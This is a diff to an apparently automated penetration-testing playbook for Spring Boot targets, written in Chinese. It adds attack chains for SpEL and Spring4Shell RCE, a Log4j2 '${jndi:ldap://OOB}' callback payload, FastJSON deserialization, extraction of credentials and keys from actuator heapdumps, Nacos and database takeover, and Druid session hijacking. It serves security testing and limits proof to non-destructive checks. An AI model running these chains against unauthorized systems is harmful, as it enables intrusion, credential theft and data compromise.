@@ -63,4 +63,70 @@ checks:
     signal: "404->401(受保护接口) / 404->405(路径在方法不对) / 固定错误->参数校验错误(进业务链)"
     escalate: "401/403 的接 shiro / spring-security playbook 做鉴权绕过"
 
+# ========== 确定性攻击链（反射档：指纹一确定,这些链直接展开打）==========
+# 这是框架组件域的灵魂:组件识别 → 组件漏洞 → 漏洞串联。
+# 每条链 = 触发条件 + 逐环节 + 环节间的产物流动(一环产出喂下一环)。
+# 命中 Spring Boot 后,按适用性直接展开,不必逐条写 Q1-Q5 作文(反射档)。
+chains:
+  - id: spel-rce
+    name: "Spring Cloud Gateway SpEL 注入 RCE"
+    trigger: "存在 /actuator/gateway/routes 或确认使用 Spring Cloud Gateway"
+    cve: CVE-2022-22947
+    steps:
+      - "POST 恶意 route(含 SpEL 表达式)到 gateway actuator"
+      - "refresh 触发表达式执行"
+      - "非破坏性验证:执行 id/whoami"
+    note: "仅模式参考,命中需实测;RCE 止于非破坏性验证"
+
+  - id: spring4shell
+    name: "Spring Core 参数绑定 RCE"
+    trigger: "Spring MVC + JDK9+ + 可 war 部署(Tomcat)"
+    cve: CVE-2022-22965
+    steps:
+      - "构造 class.module.classLoader.* 参数污染写 webshell"
+      - "访问写入的 shell 验证"
+    note: "条件严格(war/tomcat),不满足则标不适用+理由"
+
+  - id: log4j2-jndi
+    name: "Log4j2 JNDI 注入 RCE"
+    trigger: "任意可被日志记录的输入点(UA/参数/header)"
+    cve: CVE-2021-44228
+    steps:
+      - "在输入点注入 ${jndi:ldap://OOB} -> 走 OOB 回连验证(DNS/LDAP 日志)"
+      - "确认回连后再评估 RCE"
+    note: "OOB 证据(回连日志)与响应同等有效(L1 准则一)"
+
+  - id: fastjson-deser
+    name: "FastJSON 反序列化"
+    trigger: "参数传 JSON;构造恶意/畸形 JSON 触发报错,报错特征指向 FastJSON"
+    steps:
+      - "先探版本:畸形 JSON 报错里的 com.alibaba.fastjson 栈特征"
+      - "按版本选链(autoType 绕过链),OOB 或非破坏性验证"
+    note: "先确认是 FastJSON 再打;版本决定用哪条链"
+
+  - id: actuator-to-nacos-db
+    name: "Actuator → Nacos 接管 → 拿DB/改配置（跨环节串联链）"
+    trigger: "actuator-exposure check 命中 /env 或 /actuator/env"
+    steps:
+      - "/env 或 /heapdump 提取:Nacos 地址、账号、密钥、spring.datasource"
+      - "→ 产物写入 intel(供 infra 域 nacos check 直接用)"
+      - "→ 用凭证接管 Nacos(见 domains/infra/middleware.yaml nacos-unauth)"
+      - "→ 读/改配置拿 DB 连接串 → 连 DB(非破坏性验证读一张非敏感表)"
+    note: "这是 framework→infra 跨域串联的典型:一个 Actuator 暴露串出 DB 沦陷"
+
+  - id: heapdump-secret
+    name: "heapdump → 提取内存密钥"
+    trigger: "actuator-exposure 命中 /heapdump 或 /actuator/heapdump"
+    steps:
+      - "下载 heapdump(走 http_client 存证)"
+      - "离线用 MAT/字符串提取:token/AK-SK/DB密码/session"
+      - "→ 提取物写入 intel(供各域复用,如 OSS AK 交 app 域打对象存储)"
+
+  - id: druid-session
+    name: "Druid 未授权 → 劫持 session 登录后台"
+    trigger: "存在 /druid/ 路径"
+    steps:
+      - "见 domains/infra/middleware.yaml druid-unauth"
+      - "→ 劫持的 session 写入 intel,供 app 域带 session 打后台接口"
+
 cve_note: "识别出具体 Spring Boot 版本后必须查 CVE(如 Spring4Shell CVE-2022-22965 需 war+特定条件),按 L1 反幻觉:编号可溯源、适用性落到实测特征,拿不准标 疑似·待核实"
